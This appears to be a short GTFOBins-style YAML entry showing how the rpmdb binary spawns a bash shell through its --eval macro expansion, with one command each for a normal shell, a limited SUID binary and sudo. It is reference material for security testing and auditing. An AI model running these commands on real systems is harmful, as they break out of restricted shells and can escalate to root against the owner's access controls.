---
functions:
  shell:
    - code: rpmdb --eval '%(bash 1>&2)'
  limited-suid:
    - code: ./rpmdb --eval '%(bash 1>&2)'
  sudo:
    - code: sudo rpmdb --eval '%(bash 1>&2)'
---
